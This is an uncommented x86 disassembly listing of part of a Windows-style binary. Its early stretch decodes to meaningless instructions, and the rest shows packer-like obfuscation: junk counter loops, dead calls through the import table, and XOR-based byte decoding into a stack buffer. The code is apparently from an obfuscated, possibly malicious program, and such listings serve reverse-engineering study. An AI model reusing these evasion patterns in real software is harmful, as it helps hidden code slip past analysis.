  4119cd:	cmp    al,0xab
  4119cf:	enter  0xbe2e,0xd3
  4119d3:	test   al,0x7e
  4119d5:	inc    esi
  4119d6:	mov    eax,ds:0x3dff8eb0
  4119db:	rcl    BYTE PTR [ebp+0x3c3517d3],1
  4119e1:	fisub  DWORD PTR [ebp+0x27]
  4119e4:	fcmovb st,st(2)
  4119e6:	sbb    BYTE PTR [edi+0x6],al
  4119e9:	int    0x9f
  4119eb:	pop    esi
  4119ec:	jno    0x411a62
  4119ee:	pop    ds
  4119ef:	add    ebx,DWORD PTR [ebp+0x5c]
  4119f2:	ins    BYTE PTR es:[di],dx
  4119f4:	pop    esp
  4119f5:	pop    esi
  4119f6:	push   edi
  4119f7:	fdivr  DWORD PTR [edx]
  4119f9:	sbb    edx,DWORD PTR [esi+0x254a54e8]
  4119ff:	imul   ebp,DWORD PTR [ecx+0x3b],0x28
  411a03:	jmp    0x411a3c
  411a05:	in     al,dx
  411a06:	pop    es
  411a07:	call   0xbc1a:0x755e5195
  411a0e:	and    BYTE PTR [ecx+0x6f6a29df],ah
  411a14:	jle    0x411a2e
  411a16:	or     al,0x18
  411a18:	xchg   edx,eax
  411a19:	and    al,0xb3
  411a1c:	inc    edi
  411a1d:	rcl    DWORD PTR [eax+0x79],1
  411a20:	pop    edx
  411a21:	inc    eax
  411a22:	jne    0x411a57
  411a24:	and    eax,0xbdd5964c
  411a29:	push   edx
  411a2a:	add    ebx,DWORD PTR [eax-0x77]
  411a2d:	js     0x411a05
  411a2f:	inc    ebp
  411a30:	xchg   ecx,eax
  411a31:	inc    esp
  411a32:	fistp  DWORD PTR [esi-0x50]
  411a35:	inc    edi
  411a36:	pop    ecx
  411a37:	iret   
  411a38:	in     eax,dx
  411a39:	inc    ecx
  411a3a:	ret    
  411a3b:	xor    BYTE PTR [edx],bh
  411a3d:	imul   ebx,ebp,0x1afc40fc
  411a43:	mov    ecx,0x28f84d0d
  411a48:	mov    edi,0x2746a40
  411a4d:	pop    ds
  411a4e:	fwait
  411a4f:	imul   eax,DWORD PTR [ebp+ecx*4+0x148c4098],0x5433fecd
  411a5a:	repnz mov bl,0x7
  411a5d:	(bad)  
  411a5e:	mov    ?,WORD PTR [esi]
  411a60:	and    eax,0x7870c19b
  411a65:	and    esi,edi
  411a67:	xchg   ecx,eax
  411a68:	ins    BYTE PTR es:[edi],dx
  411a69:	in     al,dx
  411a6a:	push   es
  411a6b:	in     eax,0x9c
  411a6d:	mov    edx,DWORD PTR [ecx-0xd92f4b5]
  411a73:	mov    ah,0x7f
  411a75:	cmp    BYTE PTR [edx],ah
  411a77:	mov    esi,0xcd4cc8f6
  411a7c:	(bad)  
  411a7d:	mov    ds:0x6942f4aa,eax
  411a82:	jmp    0x7758beaf
  411a87:	aam    0xd
  411a89:	out    0x23,eax
  411a8b:	pop    ss
  411a8c:	pusha  
  411a8d:	rol    DWORD PTR [ecx+ebx*8+0x37e0c773],0x35
  411a95:	xor    dl,BYTE PTR [eax+0x51a8aba8]
  411a9b:	xor    esp,esi
  411a9d:	add    edx,edx
  411a9f:	loope  0x411af6
  411aa1:	and    al,0xd1
  411aa3:	pop    eax
  411aa4:	and    BYTE PTR [edx+ebp*1+0x660ec2ca],ch
  411aab:	mov    al,0xfd
  411aad:	aaa    
  411aae:	leave  
  411aaf:	inc    esp
  411ab0:	push   edi
  411ab1:	lea    ecx,[eax-0x67]
  411ab4:	xchg   edx,eax
  411ab5:	pop    ecx
  411ab6:	ja     0x411a6b
  411ab8:	sub    ch,BYTE PTR [eax-0x66]
  411abb:	xor    ah,BYTE PTR [ecx+0x1e]
  411abe:	adc    eax,0xa11a0845
  411ac3:	push   cs
  411ac4:	pop    ebp
  411ac5:	(bad)  
  411ac6:	pop    edi
  411ac7:	daa    
  411ac8:	mov    bl,0x7
  411aca:	jp     0x411b1d
  411acc:	and    BYTE PTR [edi-0x72],ah
  411acf:	push   edi
  411ad0:	and    edi,esi
  411ad2:	or     al,BYTE PTR [ebx+edx*2-0x69c1964b]
  411ad9:	bound  ebp,QWORD PTR [ecx+ebp*8-0x1e]
  411add:	dec    DWORD PTR [ebp+0x74170b7a]
  411ae3:	xchg   esi,eax
  411ae4:	inc    ebx
  411ae5:	inc    eax
  411ae6:	xchg   BYTE PTR [edx],bl
  411ae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ae9:	in     al,0x57
  411aeb:	sub    al,0xbf
  411aed:	xchg   edx,eax
  411aee:	leave  
  411aef:	dec    edi
  411af0:	data16 fwait
  411af2:	(bad)  
  411af3:	imul   ebp,DWORD PTR [edi+0x5688e31e],0xc2774c7e
  411afd:	jne    0x411b21
  411aff:	push   ebx
  411b00:	sbb    cl,BYTE PTR [edx]
  411b02:	(bad)  
  411b03:	sbb    eax,0x155c3187
  411b08:	popf   
  411b09:	in     al,0x48
  411b0b:	mov    esi,DWORD PTR [esi-0x46]
  411b0e:	mov    BYTE PTR [ecx+0x271502fb],cl
  411b14:	repz mov al,ds:0x967824f4
  411b1a:	in     al,dx
  411b1b:	shr    DWORD PTR [esp+ecx*8],0x31
  411b1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b20:	out    dx,al
  411b21:	jle    0x411af9
  411b23:	mov    ebx,DWORD PTR ds:[edi+0x3c6e1131]
  411b2a:	pop    ebx
  411b2b:	xor    DWORD PTR ds:0x99ee3e68,ecx
  411b31:	sbb    BYTE PTR [eax+edi*8+0x119465e0],bl
  411b38:	and    eax,0xa1d7999f
  411b3d:	stos   DWORD PTR es:[edi],eax
  411b3e:	call   0xd538:0xb55b1c21
  411b45:	add    BYTE PTR [ebx],bl
  411b47:	mov    dl,0x6e
  411b49:	or     DWORD PTR [esi+0x5c5f8c85],0x84f627b3
  411b53:	pop    edi
  411b54:	jne    0x411b3e
  411b56:	inc    edx
  411b57:	lds    ebx,FWORD PTR [eax]
  411b59:	cmp    BYTE PTR [ebp+0x1d],dh
  411b5c:	fdiv   DWORD PTR [ebx-0x51]
  411b5f:	add    al,0xd8
  411b61:	hlt    
  411b62:	add    ah,dh
  411b64:	pop    edi
  411b65:	test   DWORD PTR [ecx+ebp*1+0x25ac910b],esp
  411b6c:	cmc    
  411b6d:	fs or  bl,ah
  411b70:	push   ebx
  411b71:	push   0xfffffff4
  411b73:	scas   eax,DWORD PTR es:[edi]
  411b74:	and    BYTE PTR [ecx+0x5f],bh
  411b77:	push   cs
  411b78:	xor    DWORD PTR [esi-0x13b2db6b],esi
  411b7e:	loopne 0x411bbe
  411b80:	scas   ax,WORD PTR es:[edi]
  411b82:	cmp    eax,0xa2ca53a7
  411b87:	lock leave 
  411b89:	sub    eax,0xf6eb79ec
  411b8e:	add    DWORD PTR [edi+0x18fed0a0],0x71
  411b95:	rol    ebp,cl
  411b97:	fld    QWORD PTR [edi-0x3b]
  411b9a:	das    
  411b9b:	mov    edx,0x9b86ece0
  411ba0:	stos   BYTE PTR es:[edi],al
  411ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ba2:	icebp  
  411ba3:	pop    esi
  411ba4:	xchg   ebp,eax
  411ba5:	mov    DWORD PTR [edx],eax
  411ba7:	not    BYTE PTR [ebx-0x6c]
  411baa:	stos   BYTE PTR es:[edi],al
  411bab:	sti    
  411bac:	out    dx,eax
  411bad:	repnz retf 0x3874
  411bb1:	add    eax,0x3dd5d098
  411bb6:	out    0x50,al
  411bb8:	push   edx
  411bb9:	imul   DWORD PTR [ecx-0x1d]
  411bbc:	push   edx
  411bbd:	push   0xffffffc8
  411bbf:	(bad)  
  411bc0:	push   cs
  411bc1:	mov    ch,0xe5
  411bc4:	pop    ds
  411bc5:	iret   
  411bc6:	mov    al,ds:0x2a1da2f9
  411bcb:	push   esp
  411bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bcd:	or     BYTE PTR [ecx],ch
  411bcf:	push   ecx
  411bd0:	push   0xffffff98
  411bd2:	sub    cl,ch
  411bd4:	scas   eax,DWORD PTR es:[edi]
  411bd5:	push   edx
  411bd6:	call   0x9c9f:0x2b7797e3
  411bdd:	fmul   DWORD PTR [ebp+0x515df568]
  411be3:	cmp    ch,BYTE PTR [ecx]
  411be5:	mov    ebx,0xa80c4e10
  411bea:	mov    al,0x97
  411bec:	and    esi,DWORD PTR [ebp-0x28]
  411bef:	mov    esi,DWORD PTR [ebp+0x10]
  411bf2:	mov    DWORD PTR [esi+0x8],eax
  411bf5:	mov    eax,DWORD PTR [ebp+0x18]
  411bf8:	mov    esi,DWORD PTR [ebp+0x10]
  411bfb:	mov    DWORD PTR [esi+0xc],eax
  411bfe:	mov    eax,DWORD PTR [ebp+0x1c]
  411c01:	mov    esi,DWORD PTR [ebp+0x10]
  411c04:	mov    DWORD PTR [esi+0x10],eax
  411c07:	mov    eax,DWORD PTR [ebp+0x8]
  411c0a:	xor    eax,ecx
  411c0c:	add    eax,edx
  411c0e:	pop    esi
  411c0f:	leave  
  411c10:	ret    0x18
  411c13:	push   ebp
  411c14:	mov    ebp,esp
  411c16:	sub    esp,0x9c
  411c1c:	mov    ecx,DWORD PTR [ebp+0x8]
  411c1f:	sbb    DWORD PTR ds:0x426f29,edi
  411c25:	mov    eax,0x8a9d
  411c2a:	adc    DWORD PTR ds:0x426eb5,0x24b2
  411c34:	xor    ax,WORD PTR [ecx+0x20]
  411c38:	mov    DWORD PTR ds:0x426f0d,0x19
  411c42:	cmp    DWORD PTR ds:0x426f0d,0x0
  411c49:	je     0x411c79
  411c4f:	cmp    DWORD PTR ds:0x426f0d,0x23
  411c56:	jge    0x411c79
  411c5c:	jmp    0x411c67
  411c61:	call   DWORD PTR ds:0x42fa00
  411c67:	mov    ecx,DWORD PTR ds:0x426f0d
  411c6d:	dec    ecx
  411c6e:	mov    DWORD PTR ds:0x426f0d,ecx
  411c74:	jmp    0x411c42
  411c79:	mov    ecx,0x3b5f
  411c7e:	add    ax,cx
  411c81:	mov    DWORD PTR ds:0x426e85,0x19
  411c8b:	cmp    DWORD PTR ds:0x426e85,0x0
  411c92:	je     0x411ce1
  411c98:	cmp    DWORD PTR ds:0x426e85,0xc
  411c9f:	jg     0x411ce1
  411ca5:	jmp    0x411cb3
  411caa:	push   DWORD PTR [ebp-0x10]
  411cad:	call   DWORD PTR ds:0x42fa3c
  411cb3:	cmp    DWORD PTR ds:0x426e85,0xd
  411cba:	jne    0x411ccf
  411cc0:	xor    ecx,ecx
  411cc2:	or     ecx,DWORD PTR ds:0x426e85
  411cc8:	dec    ecx
  411cc9:	mov    DWORD PTR ds:0x426e85,ecx
  411ccf:	mov    ecx,DWORD PTR ds:0x426e85
  411cd5:	dec    ecx
  411cd6:	mov    DWORD PTR ds:0x426e85,ecx
  411cdc:	jmp    0x411c8b
  411ce1:	movzx  eax,ax
  411ce4:	mov    ecx,DWORD PTR ds:0x426f25
  411cea:	sub    DWORD PTR ds:0x426e89,ecx
  411cf0:	mov    DWORD PTR [ebp-0x10],eax
  411cf3:	mov    BYTE PTR [ebp-0x1],0x7a
  411cf7:	lea    eax,[ebp-0x1]
  411cfa:	mov    DWORD PTR [ebp-0xc],eax
  411cfd:	mov    al,BYTE PTR [ebp-0x1]
  411d00:	mov    ecx,DWORD PTR [ebp-0xc]
  411d03:	xor    al,0x81
  411d05:	sub    DWORD PTR ds:0x426f2d,0x318c
  411d0f:	add    al,0x6
  411d11:	sub    DWORD PTR ds:0x426ef5,0x54d2
  411d1b:	mov    BYTE PTR [ecx],al
  411d1d:	and    eax,eax
  411d1f:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411d26:	push   ebx
  411d27:	and    DWORD PTR ds:0x426e8d,0x0
  411d31:	mov    ecx,DWORD PTR ds:0x426e8d
  411d37:	inc    ecx
  411d38:	mov    DWORD PTR ds:0x426e8d,ecx
  411d3e:	cmp    DWORD PTR ds:0x426e8d,0x22
  411d45:	jg     0x411d8e
  411d4b:	jmp    0x411d81
  411d50:	push   0x70b5
  411d55:	push   0x7924
  411d5a:	push   0x4ec8
  411d5f:	push   0x56ca
  411d64:	push   0x88b0
  411d69:	push   0x70c2
  411d6e:	push   0x4f11
  411d73:	push   DWORD PTR [ebp-0x1c]
  411d76:	push   0x827e
  411d7b:	call   DWORD PTR ds:0x42fa04
  411d81:	cmp    DWORD PTR ds:0x426e8d,0x18
  411d88:	jb     0x411d31
  411d8e:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  411d95:	and    DWORD PTR ds:0x426ee1,0x0
  411d9f:	jmp    0x411daf
  411da4:	mov    eax,ds:0x426ee1
  411da9:	inc    eax
  411daa:	mov    ds:0x426ee1,eax
  411daf:	cmp    DWORD PTR ds:0x426ee1,0x10
  411db6:	jae    0x411e0b
  411dbc:	cmp    DWORD PTR ds:0x426ee1,0x6
  411dc3:	jb     0x411e0b
  411dc9:	jmp    0x411dee
  411dce:	push   0x426ebd
  411dd3:	push   0x863e
  411dd8:	push   DWORD PTR [ebp-0x14]
  411ddb:	push   DWORD PTR [ebp-0x28]
  411dde:	push   0x80d0
  411de3:	push   0x79b2
  411de8:	call   DWORD PTR ds:0x42fa40
  411dee:	cmp    DWORD PTR ds:0x426ee1,0x5
  411df5:	jne    0x411e06
  411dfb:	mov    eax,ds:0x426ee1
  411e00:	inc    eax
  411e01:	mov    ds:0x426ee1,eax
  411e06:	jmp    0x411da4
  411e0b:	mov    ecx,DWORD PTR [ebp-0x18]
  411e0e:	push   esi
  411e0f:	mov    eax,0x75108b3
  411e14:	xor    ecx,eax
  411e16:	mov    esi,0x3272fa
  411e1b:	push   edi
  411e1c:	add    ecx,esi
  411e1e:	jmp    0x411e3e
  411e23:	not    DWORD PTR ds:0x426ea5
  411e29:	mov    dl,BYTE PTR [ebp-0x1]
  411e2c:	mov    DWORD PTR ds:0x426f25,0x1eab
  411e36:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  411e3d:	inc    ecx
  411e3e:	mov    DWORD PTR ds:0x426ee1,0x6456
  411e48:	cmp    ecx,0x40
  411e4b:	mov    DWORD PTR ds:0x426ea9,0x5cb
  411e55:	jb     0x411e23
  411e5b:	sub    DWORD PTR ds:0x426ec5,0x4698
  411e65:	mov    edx,DWORD PTR [ebp-0x18]
  411e68:	xor    edx,eax
  411e6a:	add    edx,esi
  411e6c:	mov    DWORD PTR ds:0x426ea9,0x4896
  411e76:	jmp    0x411f44
  411e7b:	mov    edi,DWORD PTR [ebp+0x8]
  411e7e:	and    DWORD PTR ds:0x426e9d,0x0
  411e88:	jmp    0x411e9a
  411e8d:	mov    ecx,DWORD PTR ds:0x426e9d
  411e93:	inc    ecx
  411e94:	mov    DWORD PTR ds:0x426e9d,ecx
  411e9a:	cmp    DWORD PTR ds:0x426e9d,0x12
  411ea1:	jae    0x411ec4
  411ea7:	cmp    DWORD PTR ds:0x426e9d,0x1f
  411eae:	jg     0x411ec4
  411eb4:	jmp    0x411ebf
  411eb9:	call   DWORD PTR ds:0x42fa08
  411ebf:	jmp    0x411e8d
  411ec4:	mov    ecx,0x8a9d
  411ec9:	add    DWORD PTR ds:0x426f1d,0x3bc7
  411ed3:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411ed8:	mov    edi,0x3b5f
  411edd:	or     DWORD PTR ds:0x426ec9,0x426e8d
  411ee7:	add    cx,di
  411eea:	movzx  ecx,cx
  411eed:	mov    DWORD PTR [ebp-0xc],ecx
  411ef0:	mov    ecx,DWORD PTR ds:0x426ee9
  411ef6:	sub    ecx,DWORD PTR ds:0x426e99
  411efc:	mov    DWORD PTR ds:0x426ee9,ecx
  411f02:	mov    ecx,DWORD PTR [ebp+0x8]
  411f05:	or     DWORD PTR ds:0x426f2d,0x426e89
  411f0f:	movzx  ecx,WORD PTR [ecx+edx*4]
  411f13:	adc    DWORD PTR ds:0x426ebd,0x426ef1
  411f1d:	xor    ecx,0x8a9d
  411f23:	xor    DWORD PTR ds:0x426ef5,0x426e95
  411f2d:	add    ecx,edi
  411f2f:	mov    edi,DWORD PTR [ebp-0xc]
  411f32:	mov    DWORD PTR ds:0x426f09,0x3565
  411f3c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411f43:	inc    edx
  411f44:	mov    ecx,0x1c2a
  411f49:	mov    ecx,DWORD PTR [ebp-0x10]
  411f4c:	cmp    edx,ecx
  411f4e:	jne    0x411e7b
  411f54:	sub    edx,0x34ee
  411f5a:	mov    ecx,DWORD PTR [ebp-0x18]
  411f5d:	xor    DWORD PTR ds:0x426ef9,ecx
  411f63:	mov    edx,DWORD PTR [ebp+0x10]
  411f66:	mov    DWORD PTR ds:0x426ec5,0x17
  411f70:	cmp    DWORD PTR ds:0x426ec5,0x0
  411f77:	je     0x411fcf
  411f7d:	cmp    DWORD PTR ds:0x426ec5,0x2
  411f84:	jl     0x411fcf
  411f8a:	jmp    0x411f9f
  411f8f:	push   0x4ca2
  411f94:	push   0x426035
  411f99:	call   DWORD PTR ds:0x42fa44
  411f9f:	cmp    DWORD PTR ds:0x426ec5,0x3
  411fa6:	jne    0x411fbb
  411fac:	xor    edi,edi
  411fae:	xor    edi,DWORD PTR ds:0x426ec5
  411fb4:	dec    edi
  411fb5:	mov    DWORD PTR ds:0x426ec5,edi
  411fbb:	xor    edi,edi
  411fbd:	add    edi,DWORD PTR ds:0x426ec5
  411fc3:	dec    edi
  411fc4:	mov    DWORD PTR ds:0x426ec5,edi
  411fca:	jmp    0x411f70
  411fcf:	xor    ecx,eax
  411fd1:	mov    DWORD PTR ds:0x426f21,0x1d
  411fdb:	cmp    DWORD PTR ds:0x426f21,0x0
  411fe2:	je     0x41201c
  411fe8:	cmp    DWORD PTR ds:0x426f21,0x2c
  411fef:	jg     0x41201c
  411ff5:	jmp    0x41200a
  411ffa:	push   0x426ed5
  411fff:	push   0x3809
  412004:	call   DWORD PTR ds:0x42fa48
  41200a:	mov    edi,DWORD PTR ds:0x426f21
  412010:	dec    edi
  412011:	mov    DWORD PTR ds:0x426f21,edi
  412017:	jmp    0x411fdb
  41201c:	add    ecx,esi
  41201e:	xor    edi,DWORD PTR ds:0x426ea9
  412024:	mov    DWORD PTR [edx],ecx
  412026:	mov    ecx,DWORD PTR [ebp-0x18]
  412029:	xor    ecx,eax
  41202b:	add    ecx,esi
  41202d:	and    edi,0x6cf8
  412033:	mov    DWORD PTR [ebp-0xc],ecx
  412036:	mov    DWORD PTR ds:0x426ea5,0x13
  412040:	cmp    DWORD PTR ds:0x426ea5,0x0
  412047:	je     0x41207a
  41204d:	cmp    DWORD PTR ds:0x426ea5,0x1f
  412054:	jge    0x41207a
  41205a:	jmp    0x412068
  41205f:	push   DWORD PTR [ebp-0x24]
  412062:	call   DWORD PTR ds:0x42fa0c
  412068:	mov    edi,DWORD PTR ds:0x426ea5
  41206e:	dec    edi
  41206f:	mov    DWORD PTR ds:0x426ea5,edi
  412075:	jmp    0x412040
  41207a:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  412081:	mov    DWORD PTR ds:0x426ea9,0x18
  41208b:	cmp    DWORD PTR ds:0x426ea9,0x0
  412092:	je     0x4120ec
  412098:	cmp    DWORD PTR ds:0x426ea9,0xa
  41209f:	ja     0x4120ec
  4120a5:	jmp    0x4120c0
  4120aa:	push   DWORD PTR [ebp-0x28]
  4120ad:	push   0x4ee1
  4120b2:	push   DWORD PTR [ebp-0x20]
  4120b5:	push   0x56ea
  4120ba:	call   DWORD PTR ds:0x42fa4c
  4120c0:	cmp    DWORD PTR ds:0x426ea9,0xb
  4120c7:	jne    0x4120da
  4120cd:	mov    ecx,DWORD PTR ds:0x426ea9
  4120d3:	dec    ecx
  4120d4:	mov    DWORD PTR ds:0x426ea9,ecx
  4120da:	mov    ecx,DWORD PTR ds:0x426ea9
  4120e0:	dec    ecx
  4120e1:	mov    DWORD PTR ds:0x426ea9,ecx
  4120e7:	jmp    0x41208b
  4120ec:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4120f3:	adc    edi,edi
  4120f5:	mov    DWORD PTR [ebp-0x10],0xf89c95b5
  4120fc:	mov    ecx,DWORD PTR ds:0x426f19
  412102:	adc    DWORD PTR ds:0x426eb9,ecx
  412108:	mov    ecx,DWORD PTR [ebp-0x14]
  41210b:	movzx  edi,BYTE PTR ds:0x426ef5
  412112:	add    edi,DWORD PTR ds:0x426ed5
  412118:	mov    DWORD PTR ds:0x426ef5,edi
  41211e:	mov    DWORD PTR [ebp+0x8],ecx
  412121:	mov    ecx,DWORD PTR [ebp+0x8]
  412124:	mov    DWORD PTR ds:0x426eb1,0x11
  41212e:	cmp    DWORD PTR ds:0x426eb1,0x0
  412135:	je     0x4121a1
  41213b:	cmp    DWORD PTR ds:0x426eb1,0x9
  412142:	jl     0x4121a1
  412148:	jmp    0x412175
  41214d:	push   DWORD PTR [ebp-0x24]
  412150:	push   0x5b11
  412155:	push   0x5886
  41215a:	push   DWORD PTR [ebp-0xc]
  41215d:	push   DWORD PTR [ebp-0x28]
  412160:	push   0x128a
  412165:	push   0x1ff9
  41216a:	push   0x6625
  41216f:	call   DWORD PTR ds:0x42fa10
  412175:	cmp    DWORD PTR ds:0x426eb1,0xa
  41217c:	jne    0x41218f
  412182:	mov    edi,DWORD PTR ds:0x426eb1
  412188:	dec    edi
  412189:	mov    DWORD PTR ds:0x426eb1,edi
  41218f:	mov    edi,DWORD PTR ds:0x426eb1
  412195:	dec    edi
  412196:	mov    DWORD PTR ds:0x426eb1,edi
  41219c:	jmp    0x41212e
  4121a1:	xor    ecx,eax
  4121a3:	and    DWORD PTR ds:0x426ebd,0x0
  4121ad:	jmp    0x4121bf
  4121b2:	mov    edi,DWORD PTR ds:0x426ebd
  4121b8:	inc    edi
  4121b9:	mov    DWORD PTR ds:0x426ebd,edi
  4121bf:	cmp    DWORD PTR ds:0x426ebd,0x14
  4121c6:	jae    0x4121e9
  4121cc:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4121d3:	jle    0x4121e9
  4121d9:	jmp    0x4121e4
  4121de:	call   DWORD PTR ds:0x42fa14
  4121e4:	jmp    0x4121b2
  4121e9:	add    ecx,esi
  4121eb:	mov    edi,DWORD PTR ds:0x426ec9
  4121f1:	mov    ecx,0xf641bea
  4121f6:	mov    edi,0x5a1eade
  4121fb:	mov    DWORD PTR ds:0x426ed5,0x1d19
  412205:	je     0x416e72
  41220b:	and    DWORD PTR ds:0x426e95,0x0
  412215:	jmp    0x412229
  41221a:	xor    ebx,ebx
  41221c:	xor    ebx,DWORD PTR ds:0x426e95
  412222:	inc    ebx
  412223:	mov    DWORD PTR ds:0x426e95,ebx
  412229:	cmp    DWORD PTR ds:0x426e95,0x1f
  412230:	jae    0x41225c
  412236:	cmp    DWORD PTR ds:0x426e95,0x2f
  41223d:	jl     0x41225c
  412243:	jmp    0x412257
  412248:	push   DWORD PTR [ebp-0x18]
  41224b:	push   DWORD PTR [ebp-0x18]
  41224e:	push   DWORD PTR [ebp-0x10]
  412251:	call   DWORD PTR ds:0x42fa18
  412257:	jmp    0x41221a
  41225c:	mov    edx,DWORD PTR [ebp+0x8]
  41225f:	mov    ebx,DWORD PTR ds:0x426ec5
  412265:	add    ebx,DWORD PTR ds:0x426ea1
  41226b:	mov    DWORD PTR ds:0x426ec5,ebx
  412271:	mov    ebx,DWORD PTR [ebp-0x8]
  412274:	xor    edx,eax
  412276:	sbb    DWORD PTR ds:0x426ea1,0x426edd
  412280:	xor    ebx,eax
  412282:	add    DWORD PTR ds:0x426e91,0x426ec5
  41228c:	sub    edx,ebx
  41228e:	sub    edx,esi
  412290:	sbb    DWORD PTR ds:0x426eb5,edi
  412296:	xor    edx,eax
  412298:	mov    DWORD PTR [ebp+0x8],edx
  41229b:	add    edx,0x4d69
  4122a1:	mov    edx,DWORD PTR [ebp+0x8]
  4122a4:	mov    ebx,DWORD PTR [ebp-0x58]
  4122a7:	lea    edx,[ebx+edx*1+0x5708f4]
  4122ae:	mov    DWORD PTR [ebp-0x58],edx
  4122b1:	mov    edx,DWORD PTR [ebp+0x8]
  4122b4:	xor    ebx,DWORD PTR ds:0x426f05
  4122ba:	mov    ebx,DWORD PTR [ebp-0x54]
  4122bd:	and    DWORD PTR ds:0x426f11,0x6a73
  4122c7:	add    edx,0x64f89a
  4122cd:	adc    DWORD PTR ds:0x426ea5,0x426ef1
  4122d7:	imul   edx,ebx
  4122da:	or     DWORD PTR ds:0x426eed,0x7801
  4122e4:	mov    DWORD PTR [ebp-0x54],edx
  4122e7:	and    DWORD PTR ds:0x426ea9,0x0
  4122f1:	mov    edx,DWORD PTR ds:0x426ea9
  4122f7:	inc    edx
  4122f8:	mov    DWORD PTR ds:0x426ea9,edx
  4122fe:	cmp    DWORD PTR ds:0x426ea9,0xa
  412305:	ja     0x41234d
  41230b:	jmp    0x412326
  412310:	push   DWORD PTR [ebp-0x18]
  412313:	push   0x70df
  412318:	push   DWORD PTR [ebp-0x28]
  41231b:	push   0x6818
  412320:	call   DWORD PTR ds:0x42fa1c
  412326:	cmp    DWORD PTR ds:0x426ea9,0x9
  41232d:	jne    0x412340
  412333:	mov    edx,DWORD PTR ds:0x426ea9
  412339:	inc    edx
  41233a:	mov    DWORD PTR ds:0x426ea9,edx
  412340:	cmp    DWORD PTR ds:0x426ea9,0x1f
  412347:	jb     0x4122f1
  41234d:	mov    edx,DWORD PTR [ebp+0x8]
  412350:	movzx  ebx,WORD PTR ds:0x426ef1
  412357:	sub    DWORD PTR ds:0x426eb9,ebx
  41235d:	mov    ebx,DWORD PTR [ebp-0x50]
  412360:	add    edx,0x242ebe9
  412366:	sbb    DWORD PTR ds:0x426ef1,0x426ee1
  412370:	and    edx,ebx
  412372:	mov    DWORD PTR [ebp-0x50],edx
  412375:	xor    edx,edx
  412377:	or     edx,DWORD PTR ds:0x426ed1
  41237d:	adc    DWORD PTR ds:0x426ec5,edx
  412383:	mov    edx,DWORD PTR [ebp+0x8]
  412386:	and    DWORD PTR ds:0x426f09,0x423
  412390:	mov    ebx,DWORD PTR [ebp-0x4c]
  412393:	and    DWORD PTR ds:0x426ee1,0x67c7
  41239d:	add    edx,ecx
  41239f:	mov    DWORD PTR ds:0x426ee1,0x22dc
  4123a9:	or     edx,ebx
  4123ab:	and    DWORD PTR ds:0x426f2d,0x602a
  4123b5:	mov    DWORD PTR [ebp-0x4c],edx
  4123b8:	and    DWORD PTR ds:0x426e8d,edx
  4123be:	mov    edx,DWORD PTR [ebp+0x8]
  4123c1:	mov    DWORD PTR ds:0x426ee9,0x1e
  4123cb:	cmp    DWORD PTR ds:0x426ee9,0x0
  4123d2:	je     0x41241c
  4123d8:	cmp    DWORD PTR ds:0x426ee9,0xf
  4123df:	jl     0x41241c
  4123e5:	jmp    0x4123f0
  4123ea:	call   DWORD PTR ds:0x42fa20
  4123f0:	cmp    DWORD PTR ds:0x426ee9,0x10
  4123f7:	jne    0x41240a
  4123fd:	mov    ebx,DWORD PTR ds:0x426ee9
  412403:	dec    ebx
  412404:	mov    DWORD PTR ds:0x426ee9,ebx
  41240a:	mov    ebx,DWORD PTR ds:0x426ee9
  412410:	dec    ebx
  412411:	mov    DWORD PTR ds:0x426ee9,ebx
  412417:	jmp    0x4123cb
  41241c:	mov    ebx,0xfdbe0321
  412421:	sub    ebx,edx
  412423:	sbb    edx,0x3018
  412429:	add    ebx,DWORD PTR [ebp-0x48]
  41242c:	sub    DWORD PTR ds:0x426e85,0x15fb
  412436:	mov    DWORD PTR [ebp-0x48],ebx
  412439:	mov    DWORD PTR ds:0x426f0d,0x10
  412443:	cmp    DWORD PTR ds:0x426f0d,0x0
  41244a:	je     0x4124a6
  412450:	cmp    DWORD PTR ds:0x426f0d,0x5
  412457:	jbe    0x4124a6
  41245d:	jmp    0x412478
  412462:	push   0x426000
  412467:	push   DWORD PTR [ebp-0x24]
  41246a:	push   DWORD PTR [ebp-0x14]
  41246d:	push   0x32fd
  412472:	call   DWORD PTR ds:0x42fa24
  412478:	cmp    DWORD PTR ds:0x426f0d,0x6
  41247f:	jne    0x412494
  412485:	xor    ebx,ebx
  412487:	or     ebx,DWORD PTR ds:0x426f0d
  41248d:	dec    ebx
  41248e:	mov    DWORD PTR ds:0x426f0d,ebx
  412494:	mov    ebx,DWORD PTR ds:0x426f0d
  41249a:	dec    ebx
  41249b:	mov    DWORD PTR ds:0x426f0d,ebx
  4124a1:	jmp    0x412443
  4124a6:	mov    edx,DWORD PTR [ebp+0x8]
  4124a9:	mov    ebx,DWORD PTR [ebp-0x44]
  4124ac:	add    edx,edi
  4124ae:	add    DWORD PTR ds:0x426ee5,0x5ab2
  4124b8:	xor    edx,ebx
  4124ba:	xor    DWORD PTR ds:0x426ebd,0x426e81
  4124c4:	mov    DWORD PTR [ebp-0x44],edx
  4124c7:	and    DWORD PTR ds:0x426f05,0x0
  4124d1:	mov    edx,DWORD PTR ds:0x426f05
  4124d7:	inc    edx
  4124d8:	mov    DWORD PTR ds:0x426f05,edx
  4124de:	cmp    DWORD PTR ds:0x426f05,0x28
  4124e5:	jg     0x412506
  4124eb:	jmp    0x4124f9
  4124f0:	push   DWORD PTR [ebp-0x1c]
  4124f3:	call   DWORD PTR ds:0x42fa28
  4124f9:	cmp    DWORD PTR ds:0x426f05,0x1d
  412500:	jb     0x4124d1
  412506:	mov    edx,DWORD PTR [ebp+0x8]
  412509:	xor    edx,eax
  41250b:	add    edx,esi
  41250d:	jne    0x41220b
  412513:	jmp    0x416e72
  412518:	mov    edx,DWORD PTR [ebp-0xc]
  41251b:	sub    edx,esi
  41251d:	xor    edx,eax
  41251f:	mov    DWORD PTR [ebp-0x5c],edx
  412522:	mov    edx,DWORD PTR [ebp-0x10]
  412525:	mov    ebx,DWORD PTR [ebp-0x8]
  412528:	xor    edx,eax
